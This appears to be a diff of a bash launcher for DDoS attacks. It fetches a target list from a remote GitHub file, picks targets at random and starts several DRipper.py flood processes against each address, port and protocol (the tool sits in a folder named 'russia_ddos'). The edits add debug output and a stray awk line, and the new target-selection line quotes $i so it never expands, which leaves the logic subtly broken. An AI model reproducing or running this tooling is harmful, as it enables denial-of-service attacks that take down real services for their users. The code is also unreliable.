@@ -35,19 +35,24 @@ do
    
    # Number of targets in DRipper_targets
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
+   echo "Number of targets in list: " $list_size
 
    # Get multiple random numbers to choose multiple targets from DRipper_targets
    random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
 
    # Launch several copies of DRipper.
-   for i in $(seq 1 $num_of_targets)
+   for i in $random_numbers
       do
              # Get address, port and protocol from pre-selected target
-             site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | shuf -n 1)
+             awk 'NR==5' file
+             site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | awk 'NR==$i')
              addr=$(echo $site | awk '{print $1}')
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
-            
+             echo $i
+             echo $site
+             sleep 2
+             
              # Launch DRipper
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
              
